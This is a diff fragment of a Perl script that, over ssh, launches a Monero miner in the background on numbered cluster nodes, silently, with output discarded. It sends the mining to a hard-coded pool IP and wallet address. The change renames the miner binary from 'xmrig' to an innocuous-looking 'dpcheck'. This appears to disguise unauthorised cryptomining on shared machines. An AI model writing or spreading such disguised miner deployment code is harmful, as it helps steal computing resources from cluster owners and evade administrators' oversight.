@@ -64,10 +64,10 @@ $pm->start and next;
     my $nodeindex=sprintf("%02d",$_);
     my $nodename= "node"."$nodeindex";
     my $cmd = "/usr/bin/ssh $nodename ";
-    my $mining_x = "nohup /home/jsp/xmrig-6.18.1/xmrig --coin=XMR -o 18.167.166.214:2222 \\
+    my $mining_x = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 18.167.166.214:2222 \\
        -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$nodename-$cluster \\
        -p x 2>&1 >/dev/null &";
-    my $mining_t = "nohup /home/jsp/xmrig-6.18.1/xmrig --coin=XMR -o 18.167.166.214:2222 \\
+    my $mining_t = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 18.167.166.214:2222 \\
        -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$nodename-$cluster \\
        -p x --threads=$threads 2>&1 >/dev/null &";
 
